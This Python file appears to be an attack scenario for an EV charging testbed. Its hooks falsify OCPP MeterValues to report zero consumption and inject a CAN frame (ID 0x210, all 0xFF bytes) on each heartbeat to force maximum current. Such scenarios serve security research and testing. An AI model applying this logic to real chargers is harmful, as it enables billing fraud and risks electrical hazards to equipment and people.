from infra.scenario_base import ScenarioHooks

class Scenario(ScenarioHooks):
    """
    Protocol Bridge Attack (FDI + Mad).
    
    Attack Model:
    - FDI: Report 0 energy consumption in MeterValues (OCPP).
    - Mad: Force max current via CAN injection (ID 0x210).
    """

    def pre_ocpp(self, action, payload):
        # FDI: Manipulate MeterValues to report 0 consumption
        if action == "MeterValues":
            self.log("[ATTACK] Intercepting MeterValues -> Injecting False Data (0 consumption)")
            if "meterValue" in payload:
                for mv in payload["meterValue"]:
                    if "sampledValue" in mv:
                        for sv in mv["sampledValue"]:
                            sv["value"] = "0"
        return action, payload

    def post_ocpp(self, action, payload, reply):
        return reply

    def pre_can(self, can_frame):
        # Mad: Inject Malicious CAN Frame for Max Current
        # Trigger on Heartbeat frame (0x100) to ensure periodic injection
        if can_frame and can_frame.get("id") == 0x100:
             self.log("[ATTACK] Injecting Malicious CAN Frame (ID: 0x210, Max Current)")
             return {
                 "id": 0x210,
                 "data": [0xFF, 0xFF, 0xFF, 0xFF] # Max current payload
             }
        return can_frame

    def post_can(self, can_frame):
        pass
